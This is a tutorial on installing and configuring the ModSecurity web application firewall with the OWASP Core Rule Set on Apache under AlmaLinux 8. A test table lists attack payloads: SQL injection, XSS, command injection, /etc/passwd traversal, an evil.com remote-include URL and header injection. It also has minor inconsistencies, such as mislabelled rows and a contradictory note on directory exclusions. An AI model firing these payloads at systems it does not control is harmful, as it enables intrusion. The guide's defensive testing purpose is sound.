---
title: ModSecurity
description: How to Install and Configure ModSecurity on Apache Web Server AlmaLinux 8
sidebar_position: 15
sidebar_label: ModSecurity
---

Web application security is a top priority in managing **Apache Web Server-based servers**, especially in production environments based on AlmaLinux 8. One of the most important layers of defense that we can activate is **ModSecurity**, a Web Application Firewall (WAF) that actively monitors and blocks potential attacks such as SQL Injection, Cross-Site Scripting (XSS), and various forms of exploitation against web applications. This guide provides a **complete, practical, and detailed guide** to **installing ModSecurity on Apache Web Server AlmaLinux 8**, as well as the best configuration that we can apply.

**ModSecurity** is an open-source security module for **Apache** that detects and blocks various attacks against web applications. Developed to provide an additional layer of security, ModSecurity supports complex and flexible rules and can be combined with the **OWASP ModSecurity Core Rule Set (CRS)** for broader protection against modern web threats.

## Prerequisites

- Full `root` access
- Basic Linux Command Line
- Security
- Apache/HTTPD is installed
- Domain (optional)

## Install ModSecurity
Before starting the installation process, we need to ensure that the system is up to date and that Apache is installed correctly. Here are the initial steps to take:
```
dnf update -y
dnf install httpd -y
systemctl enable --now httpd
```

If using firewalld, then allow ports 80 and 443:
```
firewall-cmd --permanent --add-service={http,https}
firewall-cmd --reload
```

ModSecurity requires several dependency packages. Run the following command to install them:
```
dnf install gcc make libxml2 libxml2-devel httpd-devel pcre pcre-devel curl-devel git geoip-devel yajl yajl-devel doxygen zlib-devel lmdb lmdb-devel ssdeep ssdeep-devel lua lua-devel wget -y
```

:::info
For Apache, the recommended version of ModSecurity is v2.9.x. Although ModSecurity 3.0 (libmodsecurity) is available, this version is designed for native use with Nginx and includes a connector for Apache. However, it is still under development and is not yet considered production-ready for Apache. The older ModSecurity module for Apache (v2.9.x) is still actively maintained and is recommended for Apache users.
:::

To get the latest release version of ModSecurity, you will need to install it manually by downloading it directly from the ModSecurity repository:
```
cd /usr/local/src
git clone https://github.com/owasp-modsecurity/ModSecurity.git
cd ModSecurity
git submodule init
git submodule update
./autogen.sh
./build.sh
./configure
make
make install
echo "LoadModule security2_module modules/mod_security2.so" | tee /etc/httpd/conf.modules.d/00-mod_security.conf
```

Restart Apache after making changes:

```
systemctl restart httpd 
``` 

Then verify the `mod_security` module with the following command:
``` 
httpd -M | grep mod_security 
``` 

Example output:

``` 
security2_module (shared) 
``` 

ModSec version verification:
``` 
strings /usr/lib64/httpd/modules/mod_security2.so | grep -i 2.9 
``` 

Example output:
``` 
ModSecurity for Apache/2.9.11 (http://www.modsecurity.org/) 
```

Download the OWASP Core Rule Set (CRS), then create a ModSecurity directory and configuration file:
```
cd /usr/local/src/ModSecurity/test/benchmark
./download-owasp-v4-rules.sh
mkdir -p /etc/httpd/modsecurity.d
cp /usr/local/src/ModSecurity/modsecurity.conf-recommended /etc/httpd/modsecurity.d/modsecurity.conf
cp /usr/local/src/ModSecurity/test/benchmark/owasp-v4/crs-setup.conf.example /etc/httpd/modsecurity.d/crs-setup.conf
cp /usr/local/src/ModSecurity/unicode.mapping /etc/httpd/modsecurity.d/
cp -r /usr/local/src/ModSecurity/test/benchmark/owasp-v4/rules /etc/httpd/modsecurity.d/
```

Then enable ModSecurity by changing `SecRuleEngine` from `DetectionOnly` to `On` and add the `IncludeOptional` parameter to enable CRS:
```
nano /etc/httpd/modsecurity.d/modsecurity.conf
```
Fill in the following parameters:
```jsx showLineNumbers title="/etc/httpd/modsecurity.d/modsecurity.conf"
SecRuleEngine On
SecAuditEngine On
SecAuditLog /var/log/httpd/modsec_audit.log

IncludeOptional /etc/httpd/modsecurity.d/crs-setup.conf
IncludeOptional /etc/httpd/modsecurity.d/rules/*.conf
```

Add the following parameters to make `modsecurity.conf` readable in Apache:
```
echo "IncludeOptional /etc/httpd/modsecurity.d/modsecurity.conf" >> /etc/httpd/conf/httpd.conf
```

Restart Apache for all configurations to take effect:
```
apachectl configtest
systemctl restart httpd
```

### Virtualhost
To **enable ModSecurity in Apache VirtualHost on AlmaLinux 8**, we need to add a specific directive inside the `<VirtualHost>` block of each domain or subdomain we want to protect.

:::info
By default, ModSecurity is enabled globally on all virtual hosts. This is because we previously added the `modsecurity.conf` directive using the command:
```
echo "IncludeOptional /etc/httpd/modsecurity.d/modsecurity.conf" >> /etc/httpd/conf/httpd.conf
```
:::

Create Virtualhost:
```
nano /etc/httpd/conf.d/focusnic.biz.id.conf
```
Fill in the virtualhost defaults and enable Modsec by adding the `SecRuleEngine On` parameter:
```jsx {7} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    SecRuleEngine on
  
    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

Create a directory for the virtualhost above:
```
mkdir -p /var/www/focusnic.biz.id/public_html
```
Save and restart Apache to apply the changes:
```
apachectl configtest
systemctl restart httpd
```
To **trigger a ModSecurity rule**, we can send an **HTTP request** containing a **suspicious payload**, such as:

- SQL Injection
- Cross Site Scripting (XSS)
- Command Injection
- Path Traversal
- Suspicious User-Agent or Headers

Here are some examples of **queries or payloads** that you can use to **test whether ModSecurity is actually active and working** on your server"

| **Attack Type** | **Payload / Query Example** | **Description** | **OWASP CRS Rule ID (General)** |
| --- | --- | --- | --- |
| **SQL Injection** | `http://focusnic.biz.id/?id=1' OR '1'='1` | Classic SQL injection pattern detection | `942100`, `942110`, `942120` |
| **XSS (Cross Site Scripting)** | `http://focusnic.biz.id/?search=<script>alert('xss')</script>` | Malicious HTML/JS script code insertion | `941100`, `941120` |
| **Command Injection** | `http://focusnic.biz.id/?cmd=ls | whoami` | Execute shell commands from parameters |
| **Path Traversal** | `http://focusnic.biz.id/?file=../../../../etc/passwd` | Attempt to access files outside the web root directory | `930100`, `930110` |
| **Remote File Inclusion** | `http://focusnic.biz.id/?load=http://evil.com/shell.txt` | Try load a file from outside the server | `930120`, `931130` |
| **User-Agent Berbahaya** | `curl -A "sqlmap"` `http://focusnic.biz.id` | Detect hacking tools such as `sqlmap`, `nikto` | `913100`, `913110` |
| **Custom Header Injection** | `curl -H "X-Real-IP: 127.0.0.1; DROP TABLE users;" http://focusnic.biz.id` | SQL injection via request header | `942200`, `942210` |
| **URL Encoding Abuse** | `http://focusnic.biz.id/?q=%3Cscript%3Ealert(1)%3C/script%3E` | SQL injection via request header | `941130` |
| **HTTP Method Abuse** | `curl -X TRACE http://focusnic.biz.id` | Use dangerous/legacy HTTP methods | `911100`, `913102` |
| **Request Body Injection** | (POST) `{"username":"admin' --", "password":"123"}` | SQL Injection via JSON body | `942130`, `942200` |


Access domains with SQL Injection query `http://focusnic.biz.id/index.php?id=1' OR '1'='1`
![](/img/almalinux8-modsec-test.png)<br/>

Then check the log in `/var/log/httpd/modsec_audit.log`:
```jsx showLineNumbers title="/var/log/httpd/modsec_audit.log"
--8e942439-H--
Message: Warning. detected SQLi using libinjection with fingerprint 's&sos' [file "/etc/httpd/modsecurity.d/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "66"] [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [data "Matched Data: s&sos found within ARGS:id: 1' OR '1'='1"] [severity "CRITICAL"] [ver "OWASP_CRS/4.3.0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/66"] [tag "PCI/6.5.2"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:blocking_inbound_anomaly_score. [file "/etc/httpd/modsecurity.d/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "233"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [ver "OWASP_CRS/4.3.0"] [tag "anomaly-evaluation"] [tag "OWASP_CRS"]
Message: Warning. Unconditional match in SecAction. [file "/etc/httpd/modsecurity.d/rules/RESPONSE-980-CORRELATION.conf"] [line "98"] [id "980170"] [msg "Anomaly Scores: (Inbound Scores: blocking=5, detection=5, per_pl=5-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=5, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=5)"] [ver "OWASP_CRS/4.3.0"] [tag "reporting"] [tag "OWASP_CRS"]
Apache-Error: [file "apache2_util.c"] [line 287] [level 3] ModSecurity: Warning. detected SQLi using libinjection with fingerprint 's&sos' [file "/etc/httpd/modsecurity.d/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "66"] [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [data "Matched Data: s&sos found within ARGS:id: 1' OR '1'='1"] [severity "CRITICAL"] [ver "OWASP_CRS/4.3.0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/66"] [tag "PCI/6.5.2"] [hostname "focusnic.biz.id"] [uri "/index.php"] [unique_id "aH0btpOPKEKHRs5tOF2OvwAAAMw"]
Apache-Error: [file "apache2_util.c"] [line 287] [level 3] ModSecurity: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:blocking_inbound_anomaly_score. [file "/etc/httpd/modsecurity.d/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "233"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [ver "OWASP_CRS/4.3.0"] [tag "anomaly-evaluation"] [tag "OWASP_CRS"] [hostname "focusnic.biz.id"] [uri "/index.php"] [unique_id "aH0btpOPKEKHRs5tOF2OvwAAAMw"]
Apache-Error: [file "apache2_util.c"] [line 287] [level 3] ModSecurity: Warning. Unconditional match in SecAction. [file "/etc/httpd/modsecurity.d/rules/RESPONSE-980-CORRELATION.conf"] [line "98"] [id "980170"] [msg "Anomaly Scores: (Inbound Scores: blocking=5, detection=5, per_pl=5-0-0-0, threshold=5) - (Outbound Scores: blocking=0, detection=0, per_pl=0-0-0-0, threshold=4) - (SQLI=5, XSS=0, RFI=0, LFI=0, RCE=0, PHPI=0, HTTP=0, SESS=0, COMBINED_SCORE=5)"] [ver "OWASP_CRS/4.3.0"] [tag "reporting"] [tag "OWASP_CRS"] [hostname "focusnic.biz.id"] [uri "/index.php"] [unique_id "aH0btpOPKEKHRs5tOF2OvwAAAMw"]
```

## ModSecurity Administration
ModSecurity management is an ongoing process to ensure the Web Application Firewall (WAF) remains effective, does not disrupt applications, and can detect the latest threats in real time.

1. ModSecurity Directory Structure <br/>

After installation and activation, if you followed the instructions above, the ModSecurity configuration file structure is located at:
| **Path** | **Purpose** |
| --- | --- |
| `/etc/httpd/modsecurity.d/modsecurity.conf` | ModSecurity main configuration |
| `/etc/httpd/modsecurity.d/unicode.mapping` | Unicode character mapping |
| `/etc/httpd/modsecurity.d/rules/` | Directory containing the OWASP Core Rule Set |
| `/var/log/httpd/modsec_audit.log` | WAF audit main log |
| `/var/log/httpd/error_log` | Combined Apache and WAF error logs |


2. ModSecurity Operating Modes <br/>

You can manage the engine mode for each test phase:

| **Value** | **Explanation** |
| --- | --- |
| `On` | Fully active and blocking threats |
| `DetectionOnly` | Just log, no blocking |
| `Off` | Deactivate ModSecurity |

Apply set on:
:::info
Use DetectionOnly when testing your application for the first time to know which rules need to be adjusted before blocking requests.
:::
```
SecRuleEngine On
```

3. ModSecurity Log Management <br/>

Default log files:
```
/var/log/httpd/modsec_audit.log
```

The log configuration is in `modsecurity.conf`:
```
SecAuditEngine RelevantOnly
SecAuditLog /var/log/httpd/modsec_audit.log
```

### Creating Custom ModSecurity Rules

Custom rules are very useful for detecting certain patterns or behaviors specific to an application.

Custom Rule Example: Detect `debug=true` Parameter
```
SecRule ARGS:debug "@streq true" \
  "id:1000001,phase:2,deny,log,msg:'[CUSTOM] Debug mode detected in request'"
```

Save in file:
```
/etc/httpd/modsecurity.d/custom_rules.conf
```

Then include the file globally:
```
Include /etc/httpd/modsecurity.d/custom_rules.conf
```

### Disabling ModSecurity per VirtualHost

If you want to disable ModSecurity completely on a single VirtualHost, simply add:
```jsx {7} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    SecRuleEngine Off

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

### Disable Rules with DirectoryMatch per VirtualHost

If only certain directories are to be excluded from ModSecurity, use:
```jsx {8,11-13} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    # Global WAF
    SecRuleEngine On

    # Disable ModSec for /uploads
    <DirectoryMatch "^/var/www/focusnic.biz.id/public_html/uploads">
    	SecRuleEngine Off
    </DirectoryMatch>

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```
Or just disable some ID rules:
```jsx {8,11-13} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    # Global WAF
    SecRuleEngine On

    # Disable ModSec for /uploads
    <DirectoryMatch "^/var/www/focusnic.biz.id/public_html/uploads">
        SecRuleRemoveById 942100 941100
    </DirectoryMatch>

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

### Disable Rules with LocationMatch per VirtualHost

If only certain URLs you want to exclude from ModSecurity, use:
```jsx {8,11-13} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    # Global WAF
    SecRuleEngine On

    # Disable ModSec for location /uploads
    <LocationMatch "^/uploads">
        SecRuleEngine Off
    </LocationMatch>

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```
Or just disable some ID rules:
```jsx {8,11-13} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    # Global WAF
    SecRuleEngine On

    # Disable ModSec for /uploads
    <LocationMatch "^/uploads">
        SecRuleRemoveById 942100 941100
    </LocationMatch>

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

### Disable Rule Specific per VirtualHost
If a particular rule ID is causing false positives on a particular domain, add:
```jsx {7-8} showLineNumbers title="/etc/httpd/conf.d/focusnic.biz.id.conf"
<VirtualHost *:80>
    ServerAdmin webmaster@focusnic.biz.id
    ServerName focusnic.biz.id
    ServerAlias www.focusnic.biz.id
    DocumentRoot /var/www/focusnic.biz.id/public_html

    SecRuleEngine On
    SecRuleRemoveById 942100 941130 932100

    ErrorLog /var/log/httpd/focusnic.biz.id-error.log
    CustomLog /var/log/httpd/focusnic.biz.id-access.log combined
</VirtualHost>
```

### Whitelist Domains from ModSecurity Processing

Domain-based whitelisting is performed with a condition on `REQUEST_HEADERS:Host`. For example:
```
SecRule REQUEST_HEADERS:Host "@streq focusnic.biz.id" \
  "id:1000002,phase:1,pass,nolog,ctl:ruleEngine=Off"
```

Put this in a custom rules file, for example `custom_rules.conf`

### Disabling Rule ID Globally

To disable a rule globally. Place on: `/etc/httpd/modsecurity.d/modsecurity.conf`, or create new file like: `/etc/httpd/modsecurity.d/disable_rules.conf`:
```
SecRuleRemoveById 942100 941130 913100
```

Then include it in the main file:

```
Include /etc/httpd/modsecurity.d/disable_rules.conf
```


## Troubleshooting

1. Error: SecPcreMatchLimit not allowed in VirtualHost during configtest <br/>

The SecPcreMatchLimit directive should only be used in the main configuration file, not in `<VirtualHost>`. The solution is to move it to the following file:

```
/etc/httpd/modsecurity.d/modsecurity.conf
```

2. The rule continues to run even though SecRuleRemoveById has been executed <br/>

Common causes include an incorrect rule ID, or an overwritten ID that causes the rule to continue running. The solution is to ensure `SecRuleRemoveById` is specified in the appropriate VirtualHost and use the correct ID from the ModSec log:

```
SecRuleRemoveById 942100 941100
```
## Conclusion

Implementing **ModSecurity on Apache Web Server AlmaLinux 8** is a practical and effective solution for strengthening the security layer of web applications. With proper installation and configuration, we can block a variety of increasingly complex cyber threats. Leveraging the **OWASP Core Rule Set** also helps significantly reduce risk.

Q: Can I disable ModSecurity for just one domain? <br/>
A: Yes. Add it inside the `<VirtualHost>` block:
```
SecRuleEngine Off
```

Q: How do I disable a rule based on a specific ID? <br/>
A: Use SecRuleRemoveById:
```
SecRuleRemoveById 942100 941100
```

Q: Can `<Directory>` be used to disable ModSecurity? <br/>
A: No. Use `<Location>` or `<LocationMatch>` because ModSecurity only works at the URL request level, not the filesystem.

Q: Can I whitelist only certain domains for a specific rule? <br/>
A: Yes, create a custom rule with SecRule and use `ctl:ruleRemoveById` with a host-based condition:
```
SecRule REQUEST_HEADERS:Host "@streq focusnic.com" "phase:1,pass,nolog,ctl:ruleRemoveById=942100"
```

Q: Where can I view the ModSecurity logs? <br/>
A: By default, the logs are located at `/var/log/httpd/modsec_audit.log`

Q: How do I find the rule ID that's blocking a request? <br/>
A: Check the ModSecurity log and look for the "id" section, such as:
```
Message: Warning. Pattern match ... [id "942100"]
```

Q: What's a safe alternative to allow the upload folder to be accessed but not processed as a script?
A: Use the following combination:
```
<LocationMatch "^/uploads">
    SecRuleEngine Off
</LocationMatch>

<Directory "/var/www/focusnic.biz.id/public_html/uploads">
    php_admin_flag engine off
    Options -ExecCGI
    Require all granted
</Directory>
```

